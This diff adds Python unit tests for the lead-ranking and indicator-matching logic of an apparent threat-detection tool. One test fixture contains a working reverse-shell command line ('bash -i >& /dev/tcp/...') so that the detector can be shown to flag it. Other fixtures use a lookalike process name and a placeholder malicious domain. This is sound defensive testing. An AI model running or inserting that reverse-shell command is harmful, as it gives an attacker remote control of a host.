@@ -104,3 +104,173 @@ def _analytic(identifier, required_roles=None):
 
 if __name__ == "__main__":
     unittest.main()
+
+
+class CandidateRankingTests(unittest.TestCase):
+    def setUp(self):
+        from romulus.intelligence.behavior_catalog import load_behavior_catalog
+        self.catalog = load_behavior_catalog()
+
+    def test_seed_query_is_bounded_by_mission_range(self):
+        from romulus.intelligence.behavior_catalog import (
+            compile_elasticsearch_seed,
+            resolve_semantic_fields,
+        )
+
+        analytic = next(item for item in self.catalog["analytics"] if item["id"] == "BH-XPLAT-002")
+        bindings = resolve_semantic_fields(["@timestamp", "process.command_line", "host.name"])
+        query = compile_elasticsearch_seed(
+            analytic,
+            bindings,
+            "@timestamp",
+            {"gte": "2026-01-01T00:00:00Z", "lte": "2026-01-02T00:00:00Z"},
+        )
+        self.assertEqual(
+            query["bool"]["filter"],
+            [{"range": {"@timestamp": {"gte": "2026-01-01T00:00:00Z", "lte": "2026-01-02T00:00:00Z"}}}],
+        )
+        self.assertIn("process.command_line", json.dumps(query))
+
+    def test_temp_execution_stays_low_and_customer_hidden(self):
+        from romulus.intelligence.behavior_catalog import build_candidate_queue
+
+        evidence = [_event("EV-TEMP", "ws-01", process_executable="/tmp/updater")]
+        candidates = build_candidate_queue(evidence, self.catalog, {"indicators": []})
+        lead = next(item for item in candidates if item["analytic_id"] == "BH-XPLAT-001")
+        self.assertEqual(lead["priority_tier"], "low")
+        self.assertFalse(lead["customer_visible"])
+        self.assertEqual(lead["disposition"], "observed")
+
+    def test_independent_behavior_promotes_specific_lead(self):
+        from romulus.intelligence.behavior_catalog import build_candidate_queue
+
+        event = _event(
+            "EV-CHAIN",
+            "srv-01",
+            process_executable="/tmp/.cache/x",
+            process_command_line="bash -i >& /dev/tcp/198.51.100.7/443 0>&1",
+        )
+        candidates = build_candidate_queue([event], self.catalog, {"indicators": []})
+        reverse_shell = next(item for item in candidates if item["analytic_id"] == "BH-LNX-016")
+        self.assertEqual(reverse_shell["disposition"], "corroborated")
+        self.assertTrue(reverse_shell["customer_visible"])
+        self.assertIn("independent behavior", " ".join(reverse_shell["score_reasons"]).lower())
+
+    def test_lookalike_process_requires_executable_path_context(self):
+        from romulus.intelligence.behavior_catalog import build_candidate_queue
+
+        name_only = _event("EV-NAME", "ws-01", process_name="svch0st.exe")
+        with_path = _event(
+            "EV-PATH",
+            "ws-01",
+            process_name="svch0st.exe",
+            process_executable=r"C:\\Users\\Public\\svch0st.exe",
+        )
+        without_context = build_candidate_queue([name_only], self.catalog, {"indicators": []})
+        with_context = build_candidate_queue([with_path], self.catalog, {"indicators": []})
+        self.assertFalse(any(item["analytic_id"] == "BH-XPLAT-005" for item in without_context))
+        self.assertTrue(any(item["analytic_id"] == "BH-XPLAT-005" for item in with_context))
+
+    def test_trusted_exact_indicator_is_top_priority_and_customer_visible(self):
+        from romulus.intelligence.behavior_catalog import build_candidate_queue
+
+        indicators = {
+            "indicators": [
+                {
+                    "id": "IOC-1",
+                    "type": "domain",
+                    "value": "evil.example",
+                    "source": "customer incident response",
+                    "confidence": 95,
+                    "created_at": "2026-01-01T00:00:00Z",
+                    "expires_at": "2027-01-01T00:00:00Z",
+                }
+            ]
+        }
+        evidence = [_event("EV-IOC", "ws-01", dns_question="evil.example")]
+        lead = build_candidate_queue(
+            evidence,
+            self.catalog,
+            indicators,
+            now="2026-10-12T00:00:00Z",
+        )[0]
+        self.assertEqual(lead["kind"], "trusted_indicator")
+        self.assertEqual(lead["priority_tier"], "critical")
+        self.assertEqual(lead["disposition"], "observed")
+        self.assertTrue(lead["customer_visible"])
+        self.assertEqual(lead["indicator_source"], "customer incident response")
+
+    def test_expired_and_substring_indicators_do_not_match(self):
+        from romulus.intelligence.behavior_catalog import build_candidate_queue
+
+        indicators = {
+            "indicators": [
+                {
+                    "id": "IOC-OLD",
+                    "type": "domain",
+                    "value": "old.example",
+                    "source": "expired feed",
+                    "confidence": 90,
+                    "created_at": "2025-01-01T00:00:00Z",
+                    "expires_at": "2025-12-31T00:00:00Z",
+                },
+                {
+                    "id": "IOC-EXACT",
+                    "type": "domain",
+                    "value": "evil.example",
+                    "source": "current feed",
+                    "confidence": 90,
+                    "created_at": "2026-01-01T00:00:00Z",
+                    "expires_at": "2027-01-01T00:00:00Z",
+                },
+            ]
+        }
+        evidence = [
+            _event("EV-OLD", "ws-01", dns_question="old.example"),
+            _event("EV-SUBSTRING", "ws-01", dns_question="notevil.example"),
+        ]
+        candidates = build_candidate_queue(evidence, self.catalog, indicators, now="2026-10-12T00:00:00Z")
+        self.assertFalse(any(item.get("indicator_id") in {"IOC-OLD", "IOC-EXACT"} for item in candidates))
+
+    def test_candidate_order_is_stable(self):
+        from romulus.intelligence.behavior_catalog import build_candidate_queue
+
+        evidence = [
+            _event("EV-B", "b-host", process_executable="/tmp/b"),
+            _event("EV-A", "a-host", process_executable="/tmp/a"),
+        ]
+        first = build_candidate_queue(evidence, self.catalog, {"indicators": []})
+        second = build_candidate_queue(list(reversed(evidence)), self.catalog, {"indicators": []})
+        self.assertEqual(
+            [(item["candidate_id"], item["priority_score"]) for item in first],
+            [(item["candidate_id"], item["priority_score"]) for item in second],
+        )
+
+
+def _event(
+    evidence_id,
+    asset,
+    process_name=None,
+    process_executable=None,
+    process_command_line=None,
+    dns_question=None,
+):
+    raw = {"host": {"name": asset}}
+    if any(value is not None for value in (process_name, process_executable, process_command_line)):
+        raw["process"] = {}
+    if process_name is not None:
+        raw["process"]["name"] = process_name
+    if process_executable is not None:
+        raw["process"]["executable"] = process_executable
+    if process_command_line is not None:
+        raw["process"]["command_line"] = process_command_line
+    if dns_question is not None:
+        raw["dns"] = {"question": {"name": dns_question}}
+    return {
+        "evidence_id": evidence_id,
+        "source": "elasticsearch",
+        "observed_at": "2026-10-12T12:00:00Z",
+        "asset": asset,
+        "observation": "test event",
+        "raw": raw,
+    }
